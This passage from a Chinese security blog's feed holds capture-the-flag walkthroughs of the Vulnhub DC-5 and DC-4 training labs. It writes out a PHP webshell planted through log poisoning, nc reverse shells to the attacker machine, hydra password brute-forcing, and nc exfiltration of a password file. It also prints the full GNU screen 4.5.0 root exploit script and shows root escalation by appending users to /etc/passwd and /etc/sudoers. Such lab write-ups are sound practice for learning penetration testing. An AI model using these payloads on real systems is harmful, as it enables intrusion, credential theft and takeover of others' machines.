title="确认文件包含"></a>确认文件包含</h4><p>在使用dirsearch扫一下目录 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121605333.png" alt="image-20231212160553291"></p><pre><code>[16:04:27] 200 -    4KB - /contact.php                                      [16:04:28] 301 -  184B  - /css  -&gt;  http://192.168.160.156/css/             [16:04:36] 200 -    6KB - /faq.php                                          [16:04:38] 200 -   17B  - /footer.php                                       [16:04:44] 301 -  184B  - /images  -&gt;  http://192.168.160.156/images/       [16:04:44] 403 -  570B  - /images/                                          [16:05:30] 200 -  852B  - /thankyou.php </code></pre><p>扫出来这些页面 其中<code>contact.php faq.php thankyou.php</code> 都已经出现过  访问一下<code>footer.php</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121612336.png" alt="image-20231212161256301"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121613522.png" alt="image-20231212161303494"></p><p>刷新一次 年份就会发生变化 因此<code>thankyou.php</code>存在文件包含 包含的文件是<code>footer.php</code></p><h4 id="使用bp找到文件包含的变量名和包含值"><a href="#使用bp找到文件包含的变量名和包含值" class="headerlink" title="使用bp找到文件包含的变量名和包含值"></a>使用bp找到文件包含的变量名和包含值</h4><p>在<code>thankyou.php</code>页面抓个包 发送到爆破页面 构造一个文件包含的GET请求头</p><pre><code>?1=1</code></pre><p>使用集束炸弹模式(Cluster bomb) 进行爆破  集束炸弹模式是笛卡尔积的方式来进行爆破 最为全面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121946709.png" alt="image-20231212194645640"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121947345.png" alt="image-20231212194700279"></p><p>爆破出了8组值 成功包含出<code>/etc/passwd</code>文件 得知文件包含的变量名是<code>file</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121954440.png" alt="image-20231212195424378"></p><h4 id="进行日志包含"><a href="#进行日志包含" class="headerlink" title="进行日志包含"></a>进行日志包含</h4><p>在前面信息搜集的时候 我们得知 该站点使用的中间件是<code>nginx</code> nginx的日志一般在<code>/var/log/nginx/access.log</code>中 尝试进行包含</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121959299.png" alt="image-20231212195953211"></p><p>根据日志包含的知识 http请求头中<code>user-agent</code>部分的内容会出现在日志中 我们就可以在<code>user-agent</code>中写入shell 在包含日志文件 执行shell</p><p>我们写入</p><pre><code>&lt;?php phpinfo(); ?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312122006456.png" alt="image-20231212200653362"></p><p>成功执行</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>既然可以进行文件包含 我们直接在<code>user-agent</code>中写入shell</p><pre><code>&lt;?php passthru($_GET[&#39;123&#39;]); ?&gt;   // passthru的作用和system类似    使用GET方法123=nc%20192.168.160.131%201111%20-e%20%2fbin%2fbash或者&lt;?php eval($_GET[&#39;123&#39;]); ?&gt;使用GET方法123=system(&#39;nc%20192.168.160.131%201111%20-e%20%2fbin%2fbash&#39;);</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312122047915.png" alt="image-20231212204710758"></p><p>在kali攻击机上监听<code>1111</code>端口</p><pre><code>nc -lvvp 1111</code></pre><p>成功反弹shell</p><p>再创造一个交互式shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131123536.png" alt="image-20231213112310481"></p><h3 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h3><h4 id="查看suid提权命令"><a href="#查看suid提权命令" class="headerlink" title="查看suid提权命令"></a>查看suid提权命令</h4><p>当前用户<code>www-data</code>还是一个低权限用户 我们先找一下在当前用户可以使用suid提权的命令</p><pre><code>find / -type f -perm -u=s 2&gt;dev/null</code></pre><pre><code>/bin/su            /bin/mount        /bin/umount       /bin/screen-4.5.0 /usr/bin/gpasswd  /usr/bin/procmail  /usr/bin/at        /usr/bin/passwd   /usr/bin/chfn /usr/bin/newgrp        /usr/bin/chsh                /usr/lib/openssh/ssh-keysign       /usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/sbin/exim4/sbin/mount.nfs</code></pre><p>看到了在DC-4中 我们使用过的老朋友<code>exim4</code>  我们先试试这次<code>exim4</code>是否也可以成功提权</p><h4 id="exim4提权"><a href="#exim4提权" class="headerlink" title="exim4提权"></a>exim4提权</h4><h5 id="1-查找漏洞利用脚本"><a href="#1-查找漏洞利用脚本" class="headerlink" title="1.查找漏洞利用脚本"></a>1.查找漏洞利用脚本</h5><p>先查看靶机中<code>exim4</code>命令的版本</p><pre><code>exim4 --version</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131307143.png" alt="image-20231213130751087"></p><p>得知是<code>4.84-2</code>的版本</p><p>使用<code>searchsploit</code>找一下漏洞利用脚本</p><pre><code>searchsploit exim 4.8</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131501264.png" alt="image-20231213150149193"></p><p>但是很可惜 并没有找到合适版本的exim4漏洞利用脚本</p><h5 id="2-exim4提权失败"><a href="#2-exim4提权失败" class="headerlink" title="2.exim4提权失败"></a>2.exim4提权失败</h5><h4 id="screen-4-5-0-提权"><a href="#screen-4-5-0-提权" class="headerlink" title="screen-4.5.0 提权"></a>screen-4.5.0 提权</h4><p>在前面查看suid提权命令的时候 还发现一个<code>screen-4.5.0 </code> </p><pre><code>GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。screen命令虚拟了一个终端(session)，可在终端内运行命令，多次运行screen命令可以虚拟多个不同的终端；每个session可以开启多个窗口，每个窗口有自己的shell，可以在不同的窗口中同时运行多个命令，每个命令都相当于在前台运行，可以与用户交互；</code></pre><h5 id="1-查找漏洞利用脚本-1"><a href="#1-查找漏洞利用脚本-1" class="headerlink" title="1.查找漏洞利用脚本"></a>1.查找漏洞利用脚本</h5><pre><code>searchsploit screen 4.5.0</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131517098.png" alt="image-20231213151707051"></p><p>找到两个权限提升的漏洞利用脚本 </p><h5 id="2-将漏洞利用脚本保存到攻击机"><a href="#2-将漏洞利用脚本保存到攻击机" class="headerlink" title="2.将漏洞利用脚本保存到攻击机"></a>2.将漏洞利用脚本保存到攻击机</h5><pre><code>searchsploit -p linux/local/41154.shsearchsploit -p linux/local/41152.txtcp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.shcp /usr/share/exploitdb/exploits/linux/local/41152.txt 41152.txt</code></pre><h5 id="3-查看41154-sh"><a href="#3-查看41154-sh" class="headerlink" title="3.查看41154.sh"></a>3.查看41154.sh</h5><pre><code class="sh">#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017)echo &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123;    chown(&quot;/tmp/rootshell&quot;, 0, 0);    chmod(&quot;/tmp/rootshell&quot;, 04755);    unlink(&quot;/etc/ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);&#125;EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;/bin/sh&quot;, NULL, NULL);&#125;EOFgcc -o /tmp/rootshell /tmp/rootshell.crm -f /tmp/rootshell.cecho &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so.../tmp/rootshell</code></pre><h5 id="4-编译libhax-c文件"><a href="#4-编译libhax-c文件" class="headerlink" title="4.编译libhax.c文件"></a>4.编译libhax.c文件</h5><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131546987.png" alt="image-20231213154607953"></p><pre><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131547678.png" alt="image-20231213154753646"></p><h5 id="5-编译rootshell-c文件并删除"><a href="#5-编译rootshell-c文件并删除" class="headerlink" title="5.编译rootshell.c文件并删除"></a>5.编译rootshell.c文件并删除</h5><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131548171.png" alt="image-20231213154859138"></p><pre><code>gcc -o rootshell rootshell.c rm -f rootshell.c</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131550059.png" alt="image-20231213155059019"></p><h5 id="6-另存为新的dc5-sh文件"><a href="#6-另存为新的dc5-sh文件" class="headerlink" title="6.另存为新的dc5.sh文件"></a>6.另存为新的dc5.sh文件</h5><p>将刚才利用到的脚本和命令删除 另存为新的<code>dc5.sh</code>文件</p><pre><code class="sh">#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017)echo &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so.../tmp/rootshell</code></pre><p>保存的时候 在最后面加上 :set ff&#x3D;unix 防止脚本格式错误</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131608434.png" alt="image-20231213160812384"></p><h5 id="6-下载漏洞脚本到靶机"><a href="#6-下载漏洞脚本到靶机" class="headerlink" title="6.下载漏洞脚本到靶机"></a>6.下载漏洞脚本到靶机</h5><pre><code>wget http://192.168.160.150/rootshellwget http://192.168.160.150/libhax.sowget http://192.168.160.150/dc5.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131558256.png" alt="image-20231213155855211"></p><h5 id="7-提权"><a href="#7-提权" class="headerlink" title="7.提权"></a>7.提权</h5><p>将这三个文件传给靶机之后 赋予<code>dc5.sh</code>执行权限</p><pre><code>chmod +x dc5.shchmod 777 dc5.sh</code></pre><p>在直接执行就可以得到root权限</p><p>但是我这边会报错 在执行<code>rootshell</code>文件时显示glibc环境不对 可能是编译<code>rootshell</code>文件时的环境版本太高了 但前面的操作步骤是没问题的 解决的话 只能是换一个低版本的环境去编译<code>rootshell</code> </p><p>正常情况下就是可以直接得到root权限 进入root文件夹 看到flag文件了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312142130449.png" alt="image-20231214213017381"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此 DC-5靶场通关</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-5通关记录&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-5通关记录&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-5通关记录&quot;&gt;&lt;/a&gt;vulnhub靶场DC-5通关记录&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-4</title>
    <link href="http://w3nx1z1.github.io/2023/12/04/vulnhub%E9%9D%B6%E5%9C%BADC-4%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>http://w3nx1z1.github.io/2023/12/04/vulnhub%E9%9D%B6%E5%9C%BADC-4%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</id>
    <published>2023-12-04T13:20:50.452Z</published>
    <updated>2024-03-25T05:02:54.317Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-4通关记录"><a href="#vulnhub靶场DC-4通关记录" class="headerlink" title="vulnhub靶场DC-4通关记录"></a>vulnhub靶场DC-4通关记录</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>首先给靶机开启NAT桥接模式  在攻击机中使用nmap扫描靶机ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041516844.png" alt="image-20231204151608787"></p><p>找打靶机ip</p><pre><code>192.168.160.155</code></pre><p>再进一步扫一下端口</p><pre><code>nmap -A -p- -v 192.168.160.155</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041517935.png" alt="image-20231204151733892"></p><pre><code>开放了80端口 存在web服务 使用nginx中间件 版本1.15.10开放了22端口 存在ssh服务 Openss版本7.4p1</code></pre><p>在使用whatweb进行CMS识别 搜集一波信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041521721.png" alt="image-20231204152115668"></p><p>在使用dirsearch扫一波目录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041641121.png" alt="image-20231204164145053"></p><h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041521221.png" alt="image-20231204152149183"></p><h4 id="爆破网站登陆密码"><a href="#爆破网站登陆密码" class="headerlink" title="爆破网站登陆密码"></a>爆破网站登陆密码</h4><p>使用bp或者hydra爆破都可以</p><pre><code>hydra -l admin -P /home/kali/Desktop/brutehash/rockyou.txt 192.168.160.155 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot; -F</code></pre><pre><code>-l 用户名-L 用户名字典-p 密码-P 密码字典http-post-form 使用http协议下的post方法进行破解&quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;：1.&quot;/&quot;指登陆页面所在目录 该网站的登陆目录在index.php 2.POST提交的内容只是把用户名和密码部分换成了^USER^和^PASS^。USER对应前面的-l 后跟的用户名root，PASS会被字典中的密码逐个替换</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041711268.png" alt="image-20231204171144220"></p><p>密码是happy</p><p>bp爆破就用本机访问一下 抓个包 找几个字典 一秒爆出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041712487.png" alt="image-20231204171250442"></p><p>使用<code>username:admin/password:happy</code>登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041719106.png" alt="image-20231204171902074"></p><p>看起来有一个任意命令执行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041736027.png" alt="image-20231204173657999"></p><p>执行了<code>ls -l</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041738462.png" alt="image-20231204173842427"></p><p>执行了<code>du -h</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041738659.png" alt="image-20231204173857621"></p><p>执行了<code>df -h</code></p><p>抓个包看看</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041739572.png" alt="image-20231204173927523"></p><p>真是执行了<code>ls -l</code> 同时也看到这里空格是使用<code>+</code>表示的 那我们可以利用这一点反弹shell了</p><h3 id="三、反弹shell"><a href="#三、反弹shell" class="headerlink" title="三、反弹shell"></a>三、反弹shell</h3><p>先开一个终端 监听一下端口</p><pre><code>nc -lvvp 1145</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042027819.png" alt="image-20231204202758687"></p><p>再在bp上写入反弹shell的命令 </p><pre><code>nc 192.168.160.131 4444 -e /bin/bash在这个环境中 空格要使用+代替nc+192.168.160.131+4444+-e+/bin/bash</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042055519.png" alt="image-20231204205554477"></p><p>这边这个ip一定要写攻击机的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042056474.png" alt="image-20231204205638442"></p><p>反弹成功</p><p>在用python创造一个交互式的shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042059878.png" alt="image-20231204205905844"></p><h4 id="找到并提取密码文件"><a href="#找到并提取密码文件" class="headerlink" title="找到并提取密码文件"></a>找到并提取密码文件</h4><p>在home文件夹下查看用户 找到三个用户</p><pre><code>charles jim sam</code></pre><p>在<code>/home/jim/backups</code>下找到一个<code>old-passwords.bak</code> 查看内容 看起来很像字典 使用nc将这个文件保存到本机</p><p>现在攻击机下监听一个端口 指定接受一个文件</p><pre><code>nc -lvvp 5555 &gt; old-passwords.bak</code></pre><p>再在shell里面监听相同的端口 指定发送上面的密码文件</p><pre><code>nc 192.168.160.131 5555 &lt; old-passwords.bak</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042114958.png" alt="image-20231204211415921"></p><p>接收到了</p><h3 id="四、登陆用户"><a href="#四、登陆用户" class="headerlink" title="四、登陆用户"></a>四、登陆用户</h3><h4 id="使用hydra爆破jim用户密码"><a href="#使用hydra爆破jim用户密码" class="headerlink" title="使用hydra爆破jim用户密码"></a>使用hydra爆破jim用户密码</h4><p>可以使用这个字典文件爆破jim用户的密码 还是使用hydra</p><pre><code>hydra -l jim -P old-passwords.bak ssh://192.168.160.155</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042118415.png" alt="image-20231204211835368"></p><p>爆破出密码为&#96;&#96;</p><h4 id="登陆jim用户-发现charles用户密码"><a href="#登陆jim用户-发现charles用户密码" class="headerlink" title="登陆jim用户 发现charles用户密码"></a>登陆jim用户 发现charles用户密码</h4><p>使用刚才爆出来的jim用户密码进行登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051105493.png" alt="image-20231205110555449"></p><p>使用ssh也可以进行连接</p><pre><code>ssh jim@192.168.160.155</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051125436.png" alt="image-20231205112534390"></p><p>提示有一封邮件 </p><p>在<code>/var/mail</code>文件夹下找到邮件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051141626.png" alt="image-20231205114140559"></p><p>这是一封charles发给jim的邮件 从中可以得到charles的登录密码为<code>^xHhA&amp;hvim0y</code></p><h3 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h3><h4 id="使用teehee进行提权"><a href="#使用teehee进行提权" class="headerlink" title="使用teehee进行提权"></a>使用teehee进行提权</h4><p>使用上面得到的密码 切换到charles用户后 查看这个用户有什么可以使用的root命令</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051153811.png" alt="image-20231205115337768"></p><p>发现可以无密码使用teehee</p><p>先看一下用法</p><pre><code>teehee -h</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051415590.png" alt="image-20231205141537541"></p><p><code>-a</code>参数允许往一个文件中追加内容 </p><h5 id="1-x2F-etc-x2F-passwd"><a href="#1-x2F-etc-x2F-passwd" class="headerlink" title="1.&#x2F;etc&#x2F;passwd"></a>1.&#x2F;etc&#x2F;passwd</h5><p>我们可以利用这一点 向<code>/etc/passwd</code>文件中追加一个新的超级用户</p><p>先用openssl生成一个加盐的密码</p><pre><code>openssl passwd -1 -salt 1*2*3 abcd# $1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1</code></pre><p>使用teehee创建超级用户</p><pre><code>echo &#39;abc:$1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1:0:0:root:/bin/bash&#39; |sudo teehee -a /etc/passwd</code></pre><p>登录abc用户 输入密码<code>abcd</code> 成功登录 是root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051426768.png" alt="image-20231205142608726"></p><h5 id="2-x2F-etc-x2F-sudoers"><a href="#2-x2F-etc-x2F-sudoers" class="headerlink" title="2.&#x2F;etc&#x2F;sudoers"></a>2.&#x2F;etc&#x2F;sudoers</h5><p>相同的 我们也可以添加一个超级用户到<code>/etc/sudoers</code>中  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051526756.png" alt="image-20231205152634690"></p><p>我们可以使用teehee在&#x2F;etc&#x2F;sudoers文件后追加</p><pre><code>charles    ALL=(root) ALL</code></pre><p>输入</p><pre><code>echo &#39;charles    ALL=(root) ALL&#39; |sudo teehee -a /etc/sudoers</code></pre><p>在使用vi提权</p><pre><code>vi privilege.txt输入charles用户密码:!/bin/bash</code></pre><p>在输入</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051538862.png" alt="image-20231205153826818"></p><h4 id="exim4-suid-提权"><a href="#exim4-suid-提权" class="headerlink" title="exim4(suid)提权"></a>exim4(suid)提权</h4><p>首先查看charles用户可以使用suid提权的命令</p><pre><code>find / -type f -perm -u=s 2&gt;dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051558395.png" alt="image-20231205155804351"></p><p>其中<code>exim4</code>是可以进行提权的</p><p>但是不知道为啥charles用户用不了这个命令 那我们还回到最初的www-data用户</p><pre><code>exim4 --version</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051606235.png" alt="image-20231205160605193"></p><h5 id="1-查找漏洞利用脚本"><a href="#1-查找漏洞利用脚本" class="headerlink" title="1.查找漏洞利用脚本"></a>1.查找漏洞利用脚本</h5><pre><code>searchsploit exim 4</code></pre><p>找到好几个都可以使用的提权脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051618214.png" alt="image-20231205161805143"></p><p>选择第一个<code>46996.sh</code></p><h5 id="2-利用脚本"><a href="#2-利用脚本" class="headerlink" title="2.利用脚本"></a>2.利用脚本</h5><p>找到脚本的路径</p><pre><code>searchsploit -p 46996.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051619549.png" alt="image-20231205161924515"></p><p>将脚本复制到桌面</p><pre><code>cp /usr/share/exploitdb/exploits/linux/local/46996.sh 46996.sh </code></pre><p>开启apache服务</p><pre><code>systemctl start apache2.service</code></pre><p>将这个漏洞攻击文件转移到<code>/var/html/www</code>文件夹下</p><pre><code>mv 46996.sh /var/www/html </code></pre><p>将文件下载到靶机<code>/tmp</code>中</p><pre><code>wget http://192.168.160.150/46996.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051630282.png" alt="image-20231205163009242"></p><p>看到此时用户对<code>46996.sh</code>并没有执行权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051631698.png" alt="image-20231205163148657"></p><p>赋予执行权限</p><pre><code>chmod +x 46996.sh</code></pre><p>执行脚本 发现得到root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051633173.png" alt="image-20231205163319129"></p><p>进入到root文件夹下 得到flag</p><pre><code>888       888          888 888      8888888b.                             888 888 888 888 888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 888  d8b  888          888 888      888    888                            888 888 888 888 888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 Congratulations!!!Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051427051.png" alt="image-20231205142713009"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，DC-4靶机打完</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><a href="https://blog.csdn.net/Deeeelete/article/details/106883762?ops_request_misc=&request_id=&biz_id=102&utm_term=kali%E4%B8%8A%E5%AE%89%E8%A3%85nc&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-106883762.142%5Ev96%5Epc_search_result_base9&spm=1018.2226.3001.4187">kali中nc实现通信、传输文件、反弹shell、python等脚本反弹shell</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-4通关记录&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-4通关记录&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-4通关记录&quot;&gt;&lt;/a&gt;vulnhub靶场DC-4通关记录&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
</feed>
